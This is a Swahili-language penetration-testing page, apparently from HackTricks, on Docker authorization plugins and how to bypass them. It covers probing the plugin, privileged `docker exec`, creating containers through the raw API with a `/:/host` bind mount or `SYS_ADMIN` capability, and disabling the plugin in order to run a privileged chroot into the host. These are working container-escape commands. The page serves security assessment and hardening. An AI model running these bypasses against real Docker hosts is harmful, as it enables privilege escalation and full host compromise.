# Plugins za Idhini za Runtime

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Runtime authorization plugins ni tabaka la ziada la sera linaloamua kama muombaji anaweza kufanya kitendo fulani kwenye daemon. Docker ni mfano wa kawaida. Kwa chaguo-msingi, mtu yeyote anayeweza kuwasiliana na Docker daemon ana udhibiti mpana juu yake. Authorization plugins hujaribu kupunguza mfano huo kwa kuchunguza mtumiaji aliyethibitishwa na operesheni ya API iliyohitajika, kisha kuruhusu au kukataa ombi kulingana na sera.

Somo hili linastahili kuruka kwenye ukurasa wake kwa sababu linabadilisha exploitation model wakati mwakilishi mwiba tayari ana upatikanaji wa Docker API au mtumiaji katika kikundi cha `docker`. Katika mazingira kama hayo swali haliko tena tu "je, naweza kufikia daemon?" bali pia "je, daemon imefukuzwa na tabaka la idhini, na ikiwa ndiyo, je, tabaka hilo linaweza kupitishwa kupitia endpoints zisizoshughulikiwa, weak JSON parsing, au ruhusa za usimamizi wa plugin?"

## Uendeshaji

Wakati ombi linapofika kwenye Docker daemon, mfumo wa idhini unaweza kusafirisha muktadha wa ombi kwa plugin mojawapo au zaidi zilizowekwa. Plugin inaona utambulisho wa mtumiaji aliyethibitishwa, maelezo ya ombi, headers zilizochaguliwa, na sehemu za mwili wa ombi au majibu wakati content type inafaa. Plugins nyingi zinaweza kuunganishwa mnyororo, na upatikanaji unatolewa tu ikiwa plugins zote zinaidhinisha ombi.

Mfano huu unaonekana imara, lakini usalama wake unategemea kabisa jinsi mwandishi wa sera alivyofahamu kikamilifu API. Plugin inayozuia `docker run --privileged` lakini isiyazingatia `docker exec`, ikikosa funguo mbadala za JSON kama top-level `Binds`, au kuruhusu usimamizi wa plugin inaweza kuunda hisia ya uwongo ya vizuizi huku ikiacha njia za moja kwa moja za privilege-escalation wazi.

## Malengo ya Kawaida ya Plugin

Maeneo muhimu kwa ukaguzi wa sera ni:

- container creation endpoints
- `HostConfig` fields such as `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, and namespace-sharing options
- `docker exec` behavior
- plugin management endpoints
- any endpoint that can indirectly trigger runtime actions outside the intended policy model

Kihistoria, mifano kama `authz` ya Twistlock na plugins rahisi za kielimu kama `authobot` zilirahisisha kusoma mfano huu kwa sababu faili zao za sera na njia za code zilionyesha jinsi endpoint-to-action mapping ilitekelezwa kwa kweli. Kwa kazi za assessment, somo muhimu ni kwamba mwandishi wa sera lazima afahamu uso wa API kwa ukamilifu badala ya tu amri za CLI zinazoshika macho.

## Matumizi Mabaya

Lengo la kwanza ni kujifunza ni nini hasa kinakadiriwa. Ikiwa daemon inakatao kitendo, hitilafu mara nyingi leaks jina la plugin, ambalo husaidia kutambua udhibiti unaotumika:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Iwapo unahitaji endpoint profiling pana, zana kama `docker_auth_profiler` zinasaidia kwa sababu zinafanya otomatiki kazi ambayo vingine ingekuwa ya kurudia: kukagua ni API routes na JSON structures zipi hasa zinazoruhusiwa na plugin.

Iwapo mazingira yanatumia plugin maalum na unaweza kuingiliana na API, orodhesha ni object fields gani zinazochujwa kwa kweli:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Haya ukaguzi ni muhimu kwa sababu hitilafu nyingi za idhini zinategemea shamba maalum badala ya dhana kwa ujumla. Plugin inaweza kukataa muundo wa CLI bila kuzuia kikamilifu muundo sawa wa API.

### Mfano Kamili: `docker exec` Inaongeza Ruhusa Baada ya Uundaji wa Container

Sera inayozuia uundaji wa container zenye ruhusa za juu lakini inaruhusu uundaji wa container zisizofungwa pamoja na `docker exec` bado inaweza kukwepa vizuizi:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Ikiwa daemon inakubali hatua ya pili, mtumiaji amerudisha privileged interactive process ndani ya container ambayo mwandishi wa sera aliamini ilikuwa imezuiliwa.

### Mfano Kamili: Bind Mount Through Raw API

Baadhi ya sera zilizo na kasoro huchunguza tu muundo mmoja wa JSON. Ikiwa root filesystem bind mount haizuilwi kwa uthabiti, host bado inaweza mounted:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Wazo lile lile pia linaweza kuonekana chini ya `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Athari ni kutoroka kamili kutoka kwenye host filesystem. Jambo la kuvutia ni kwamba bypass inatokana na utekelezaji wa sera usio kamili badala ya mdudu wa kernel.

### Mfano Kamili: Attribute ya capability Isiyotazamwa

Ikiwa sera itamsahau kuchuja attribute inayohusiana na capability, mshambuliaji anaweza kuunda container ambayo inapata tena capability hatari:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Mara tu `CAP_SYS_ADMIN` au uwezo wenye nguvu sawa upokuwepo, many breakout techniques zilizoelezewa katika [capabilities.md](protections/capabilities.md) na [privileged-containers.md](privileged-containers.md) zinakuwa zinapatikana.

### Mfano Kamili: Kuzima Plugin

Ikiwa plugin-management operations zinaruhusiwa, njia ya bypass safi kabisa inaweza kuwa kuzima udhibiti huo kabisa:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Hii ni kushindwa kwa sera katika ngazi ya control-plane. Tabaka la idhini liko, lakini mtumiaji aliyepaswa kuzuiliwa bado anahifadhi ruhusa ya kulizima.

## Ukaguzi

Amri hizi zinalenga kubaini kama kuna tabaka la sera na kama inaonekana kamili au ni ya uso tu.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
What is interesting here:

- Ujumbe za kukataa zinazojumuisha jina la plugin zinathibitisha kuwepo kwa authorization layer na mara nyingi zinafunua utekelezaji halisi.
- Orodha ya plugin inayoonekana kwa mshambuliaji inaweza kutosha kugundua kama operesheni za kuzima au za kurekebisha zinawezekana.
- Sera inayozuia tu vitendo vya wazi vya CLI lakini si raw API requests inapaswa kutendewa kama inaweza kupitishwa (bypassable) hadi ithibitishwe vinginevyo.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Sio imewezeshwa kwa chaguo-msingi | Ufikiaji wa Daemon kwa ufanisi ni yote-au-hakuna isipokuwa authorization plugin imewekwa | incomplete plugin policy, blacklists badala ya allowlists, kuruhusu plugin management, field-level blind spots |
| Podman | Sio sawa ya moja kwa moja wa kawaida | Podman kwa kawaida inategemea zaidi Unix permissions, rootless execution, na maamuzi ya kufichua API kuliko authz plugins za mtindo wa Docker | exposing a rootful Podman API broadly, weak socket permissions |
| containerd / CRI-O | Mfumo tofauti wa udhibiti | Runtimes hizi kawaida hutegemea socket permissions, node trust boundaries, na controls za orchestrator za ngazi ya juu badala ya Docker authz plugins | mounting the socket into workloads, weak node-local trust assumptions |
| Kubernetes | Inatumia authn/authz kwenye tabaka za API-server na kubelet, si Docker authz plugins | Cluster RBAC na admission controls ni tabaka kuu la sera | overbroad RBAC, weak admission policy, exposing kubelet or runtime APIs directly |
{{#include ../../../banners/hacktricks-training.md}}
